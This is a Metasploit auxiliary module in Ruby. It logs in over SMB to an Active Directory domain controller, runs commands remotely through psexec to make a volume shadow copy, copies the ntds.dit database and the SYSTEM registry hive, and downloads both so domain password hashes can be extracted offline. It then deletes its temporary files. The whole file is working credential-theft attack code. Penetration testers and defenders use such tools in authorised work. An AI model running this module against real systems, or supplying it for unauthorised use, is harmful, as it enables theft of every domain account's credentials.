##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  # Exploit mixins should be called first
  include Msf::Exploit::Remote::SMB::Client::Psexec
  include Msf::Auxiliary::Report
  include Msf::OptionalSession::SMB

  # Aliases for common classes
  SIMPLE = Rex::Proto::SMB::SimpleClient
  XCEPT = Rex::Proto::SMB::Exceptions
  CONST = Rex::Proto::SMB::Constants

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'PsExec NTDS.dit And SYSTEM Hive Download Utility',
        'Description' => %q{
          This module authenticates to an Active Directory Domain Controller and creates
          a volume shadow copy of the %SYSTEMDRIVE%. It then pulls down copies of the
          ntds.dit file as well as the SYSTEM hive and stores them. The ntds.dit and SYSTEM
          hive copy can be used in combination with other tools for offline extraction of AD
          password hashes. All of this is done without uploading a single binary to the
          target host.
        },
        'Author' => [
          'Royce Davis <rdavis[at]accuvant.com>' # @R3dy__
        ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'http://sourceforge.net/projects/smbexec' ],
          [ 'URL', 'https://www.optiv.com/blog/owning-computers-without-shell-access' ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES, ARTIFACTS_ON_DISK],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$']),
      OptString.new('VSCPATH', [false, 'The path to the target Volume Shadow Copy', '']),
      OptString.new('WINPATH', [true, 'The name of the Windows directory (examples: WINDOWS, WINNT)', 'WINDOWS']),
      OptBool.new('CREATE_NEW_VSC', [false, 'If true, attempts to create a volume shadow copy', false]),
    ])
  end

  # This is the main control method
  def run
    # Initialize some variables
    text = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.txt"
    bat = "\\#{datastore['WINPATH']}\\Temp\\#{Rex::Text.rand_text_alpha(16)}.bat"
    createvsc = 'vssadmin create shadow /For=%SYSTEMDRIVE%'
    @ip = datastore['RHOST']
    @smbshare = datastore['SMBSHARE']
    # Try and connect
    if session
      print_status("Using existing session #{session.sid}")
      self.simple = session.simple_client
      @ip = simple.address
    else
      return unless connect

      # Try and authenticate with given credentials
      begin
        smb_login
      rescue StandardError => e
        print_error("Unable to authenticate with given credentials: #{e}")
        return
      end
    end
    # If a VSC was specified then don't try and create one
    if !datastore['VSCPATH'].empty?
      print_status("Attempting to copy NTDS.dit from #{datastore['VSCPATH']}")
      vscpath = datastore['VSCPATH']
    else
      unless datastore['CREATE_NEW_VSC']
        vscpath = check_vss(text, bat)
      end
      vscpath ||= make_volume_shadow_copy(createvsc, text, bat)
    end

    if vscpath
      if copy_ntds(vscpath, text) && copy_sys_hive
        download_ntds(datastore['WINPATH'] + '\\Temp\\ntds')
        download_sys_hive(datastore['WINPATH'] + '\\Temp\\sys')
      else
        print_error('Failed to find a volume shadow copy.  Issuing cleanup command sequence.')
      end
    end
    cleanup_after(bat, text, "\\#{datastore['WINPATH']}\\Temp\\ntds", "\\#{datastore['WINPATH']}\\Temp\\sys")
    disconnect
  end

  # Thids method will check if a Volume Shadow Copy already exists and use that rather
  # then creating a new one
  def check_vss(text, bat)
    print_status('Checking if a Volume Shadow Copy exists already.')
    prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
    command = "%COMSPEC% /C echo vssadmin list shadows ^> #{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
    psexec(command)
    data = smb_read_file(datastore['SMBSHARE'], @ip, text)
    vscs = []
    data.each_line { |line| vscs << line if line.include?('GLOBALROOT') }
    if vscs.empty?
      print_status('No VSC Found.')
      return nil
    end
    vscpath = prepath + vscs[vscs.length - 1].to_s.split('ShadowCopy')[1].to_s.chomp
    print_good("Volume Shadow Copy exists on #{vscpath}")
    return vscpath
  rescue StandardError => e
    print_error("Unable to determine if VSS is enabled: #{e}")
    return nil
  end

  # Create a Volume Shadow Copy on the target host
  def make_volume_shadow_copy(createvsc, text, bat)
    begin
      # Try to create the shadow copy
      command = "%COMSPEC% /C echo #{createvsc} ^> #{text} > #{bat} & %COMSPEC% /C start cmd.exe /C #{bat}"
      print_status('Creating Volume Shadow Copy')
      psexec(command)
      # Get path to Volume Shadow Copy
      vscpath = get_vscpath(text)
    rescue StandardError => e
      print_error("Unable to create the Volume Shadow Copy: #{e}")
      return nil
    end
    if vscpath
      print_good("Volume Shadow Copy created on #{vscpath}")
      return vscpath
    else
      return nil
    end
  end

  # Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
  def copy_ntds(vscpath, text)
    ntdspath = vscpath.to_s + '\\' + datastore['WINPATH'] + '\\NTDS\\ntds.dit'
    command = "%COMSPEC% /C copy /Y \"#{ntdspath}\" %WINDIR%\\Temp\\ntds"
    psexec(command)
    if !check_ntds(text)
      return false
    end

    return true
  rescue StandardError => e
    print_error("Unable to copy ntds.dit from Volume Shadow Copy.Make sure target is a Windows Domain Controller: #{e}")
    return false
  end

  # Checks if ntds.dit was copied to the Windows Temp directory
  def check_ntds(text)
    print_status('Checking if NTDS.dit was copied.')
    check = "%COMSPEC% /C dir \\#{datastore['WINPATH']}\\Temp\\ntds > #{text}"
    psexec(check)
    output = smb_read_file(@smbshare, @ip, text)
    if output.include?('ntds')
      return true
    end

    return false
  end

  # Copies the SYSTEM hive file to the Temp directory on the target host
  def copy_sys_hive
    # Try to create the sys hive copy
    command = '%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y'
    return psexec(command)
  rescue StandardError => e
    print_error("Unable to copy the SYSTEM hive file: #{e}")
    return false
  end

  # Download the ntds.dit copy to your attacking machine
  def download_ntds(file)
    print_status('Downloading ntds.dit file')
    begin
      # Try to download ntds.dit
      simple.connect("\\\\#{@ip}\\#{@smbshare}")
      remotefile = simple.open(file.to_s, 'rob')
      data = remotefile.read
      remotefile.close
      ntds_path = store_loot('psexec.ntdsgrab.ntds', 'application/octet-stream', @ip, data, 'ntds.dit')
      print_good("ntds.dit stored at #{ntds_path}")
    rescue StandardError => e
      print_error("Unable to download ntds.dit: #{e}")
      return e
    end
    simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
  end

  # Download the SYSTEM hive copy to your attacking machine
  def download_sys_hive(file)
    print_status('Downloading SYSTEM hive file')
    begin
      # Try to download SYSTEM hive
      simple.connect("\\\\#{@ip}\\#{@smbshare}")
      remotefile = simple.open(file.to_s, 'rob')
      data = remotefile.read
      remotefile.close
      hive_path = store_loot('psexec.ntdsgrab.hive', 'application/octet-stream', @ip, data, 'system-hive')
      print_good("SYSTEM hive stored at #{hive_path}")
    rescue StandardError => e
      print_error("Unable to download SYSTEM hive: #{e}")
      return e
    end
    simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
  end

  # Gets the path to the Volume Shadow Copy
  def get_vscpath(file)
    prepath = '\\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy'
    vsc = ''
    output = smb_read_file(@smbshare, @ip, file)
    output.each_line do |line|
      vsc += line if line.include?('GLOBALROOT')
    end
    return prepath + vsc.split('ShadowCopy')[1].chomp
  rescue StandardError
    print_error('Could not determine the exact path to the VSC check your WINPATH')
    return nil
  end

  # Removes files created during execution.
  def cleanup_after(*files)
    simple.connect("\\\\#{@ip}\\#{@smbshare}")
    print_status('Executing cleanup...')
    files.each do |file|
      if smb_file_exist?(file)
        smb_file_rm(file)
      end
    rescue Rex::Proto::SMB::Exceptions::ErrorCode => e
      print_error("Unable to cleanup #{file}. Error: #{e}")
    end
    left = files.collect { |f| smb_file_exist?(f) }
    if left.any?
      print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(', ')} from the target.")
    else
      print_good('Cleanup was successful')
    end
    simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
  end
end
